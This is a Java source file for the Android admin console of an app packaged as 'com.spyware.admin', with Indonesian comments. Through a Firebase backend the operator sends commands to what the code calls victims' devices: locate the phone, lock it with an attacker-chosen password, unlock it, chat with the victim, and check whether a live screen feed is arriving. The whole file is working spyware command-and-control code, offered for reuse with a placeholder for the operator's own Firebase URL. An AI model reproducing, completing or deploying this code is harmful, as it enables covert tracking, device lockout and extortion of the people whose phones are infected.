package com.spyware.admin;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private static final String TAG = "ADMIN_CTRL";

    // ═══════════════════════════════════════════════
    // GANTI INI SAMA URL FIREBASE LU SENDIRI
    // ═══════════════════════════════════════════════
    private static final String FIREBASE_URL = "FIREBASE_URL_KAMU_DISINI";

    private WebView webView;
    private AdminPrefs prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        prefs = new AdminPrefs(this);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                restoreStateToJS(view);
            }
        });

        webView.addJavascriptInterface(new FirebaseInterface(), "AndroidFirebase");

        String htmlUrl = "file:///android_asset/dimzz.html?firebase_url=" + FIREBASE_URL;
        webView.loadUrl(htmlUrl);
    }

    // ═══════════════════════════════════════════════
    // RESTORE STATE KE JS
    // ═══════════════════════════════════════════════
    private void restoreStateToJS(final WebView view) {
        try {
            String device = prefs.getLastDevice();
            String page = prefs.getLastPage();
            String by = prefs.getLockBy();
            String pass = prefs.getLockPass();
            String info = prefs.getLockInfo();

            if (device == null) device = "";
            if (page == null) page = "pageDevice";
            if (by == null) by = "dimzz";
            if (pass == null) pass = "1234";
            if (info == null) info = "";

            info = info.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n");

            final String js = "(function(){"
                + "  if(typeof onAdminStateRestore==='function'){"
                + "    onAdminStateRestore('" + device + "','" + page + "','"
                + by + "','" + pass + "','" + info + "');"
                + "  }"
                + "})();";

            view.postDelayed(new Runnable() {
                @Override
                public void run() {
                    view.evaluateJavascript(js, null);
                    Log.d(TAG, "State restored");
                }
            }, 2000);
        } catch (Exception e) {
            Log.e(TAG, "restoreState: " + e.getMessage());
        }
    }

    public class FirebaseInterface {

        @JavascriptInterface
        public String getFirebaseUrl() {
            return FIREBASE_URL;
        }

        // ═══ SAVE STATE ═══
        @JavascriptInterface
        public void saveState(String device, String page, String lockBy,
                              String lockPass, String lockInfo) {
            if (prefs == null) return;
            if (device != null && !device.isEmpty()) prefs.saveLastDevice(device);
            if (page != null) prefs.saveLastPage(page);
            prefs.saveLockData(lockBy, lockPass, lockInfo, prefs.isLocked());
            Log.d(TAG, "State saved: device=" + device + " page=" + page);
        }

        @JavascriptInterface
        public void sendCommandToDevice(final String deviceKey,
                                        final String commandType,
                                        final String commandData) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String path = deviceKey + "/commands.json";
                        String payload = (commandData == null || commandData.isEmpty())
                            ? "{}" : commandData;

                        String json = "{" +
                            "\"type\":\"" + commandType + "\"," +
                            "\"value\":" + payload + "," +
                            "\"timestamp\":" + System.currentTimeMillis() + "," +
                            "\"status\":\"pending\"" +
                        "}";

                        sendPut(path, json);
                    } catch (Exception e) {
                        Log.e(TAG, "sendCommand: " + e.getMessage());
                    }
                }
            }).start();
        }

        @JavascriptInterface
        public void sendCommandToDevice(final String deviceKey, final String commandType) {
            sendCommandToDevice(deviceKey, commandType, "{}");
        }

        // ═══ FIX: METHOD LOKASI ═══
        @JavascriptInterface
        public void requestLocation(final String deviceKey) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        // Kirim command get_location ke Firebase
                        String json = "{" +
                            "\"type\":\"get_location\"," +
                            "\"value\":true," +
                            "\"timestamp\":" + System.currentTimeMillis() + "," +
                            "\"status\":\"pending\"" +
                        "}";
                        sendPut(deviceKey + "/commands.json", json);
                        Log.d(TAG, "Location command sent to " + deviceKey);

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this,
                                    "📍 Request lokasi terkirim", Toast.LENGTH_SHORT).show();
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "requestLocation: " + e.getMessage());
                    }
                }
            }).start();
        }

        @JavascriptInterface
        public void sendLockCommand(final String deviceKey,
                                    final String password,
                                    final String lockedBy,
                                    final String info) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String escPass = password == null ? "1234" : password
                            .replace("\\", "\\\\").replace("\"", "\\\"");
                        String escBy = lockedBy == null ? "dimzz" : lockedBy
                            .replace("\\", "\\\\").replace("\"", "\\\"");
                        String escInfo = info == null ? "" : info
                            .replace("\\", "\\\\").replace("\"", "\\\"")
                            .replace("\n", "\\n");

                        String lockJson = "{" +
                            "\"locked\":true," +
                            "\"password\":\"" + escPass + "\"," +
                            "\"locked_by\":\"" + escBy + "\"," +
                            "\"info\":\"" + escInfo + "\"," +
                            "\"timestamp\":" + System.currentTimeMillis() +
                        "}";

                        sendPut(deviceKey + "/lock.json", lockJson);
                        sendPut(deviceKey + "/commands.json", lockJson);

                        if (prefs != null) {
                            prefs.saveLockData(escBy, escPass, escInfo, true);
                        }

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "🔒 Lock terkirim", Toast.LENGTH_SHORT).show();
                            }
                        });

                    } catch (Exception e) {
                        Log.e(TAG, "sendLock: " + e.getMessage());
                    }
                }
            }).start();
        }

        @JavascriptInterface
        public void sendUnlockCommand(final String deviceKey) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String json = "{\"locked\":false,\"unlocked_at\":"
                            + System.currentTimeMillis() + "}";
                        sendPut(deviceKey + "/lock.json", json);
                        sendPut(deviceKey + "/commands.json", json);

                        if (prefs != null) {
                            prefs.saveLockData(prefs.getLockBy(), prefs.getLockPass(),
                                              prefs.getLockInfo(), false);
                        }

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "🔓 Unlock terkirim", Toast.LENGTH_SHORT).show();
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "sendUnlock: " + e.getMessage());
                    }
                }
            }).start();
        }

        @JavascriptInterface
        public void sendChatToVictim(final String deviceKey, final String message) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String path = deviceKey + "/chat.json";
                        String safe = message == null ? "" : message
                            .replace("\\", "\\\\").replace("\"", "\\\"");
                        String json = "{\"from\":\"admin\",\"message\":\"" +
                            safe + "\",\"timestamp\":" + System.currentTimeMillis() + "}";
                        sendPost(path, json);
                    } catch (Exception e) {
                        Log.e(TAG, "sendChat: " + e.getMessage());
                    }
                }
            }).start();
        }

        @JavascriptInterface
        public void pingDevice(final String deviceKey) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        URL url = new URL(FIREBASE_URL + deviceKey + ".json");
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setConnectTimeout(5000);
                        int code = conn.getResponseCode();
                        boolean online = false;
                        long ts = 0;
                        if (code == 200) {
                            InputStream is = conn.getInputStream();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                            StringBuilder sb = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) sb.append(line);
                            reader.close();
                            String raw = sb.toString().trim();
                            if (raw.length() > 3 && !raw.equals("null")) {
                                JSONObject obj = new JSONObject(raw);
                                ts = obj.optLong("timestamp", 0);
                                String frame = obj.optString("frame", "");
                                online = frame.length() > 100;
                            }
                        }
                        conn.disconnect();
                        long diff = System.currentTimeMillis() - ts;
                        final boolean isOnline = (diff < 15000) && online;
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this,
                                    isOnline ? "🟢 LIVE" : "🔴 OFFLINE",
                                    Toast.LENGTH_SHORT).show();
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "ping: " + e.getMessage());
                    }
                }
            }).start();
        }
    }

    private void sendPut(String path, String json) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(FIREBASE_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("PUT");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(json.getBytes("UTF-8"));
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "sendPut: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void sendPost(String path, String json) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(FIREBASE_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(json.getBytes("UTF-8"));
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "sendPost: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.loadUrl("about:blank");
            webView.removeAllViews();
            webView.destroy();
            webView = null;
        }
        super.onDestroy();
    }
}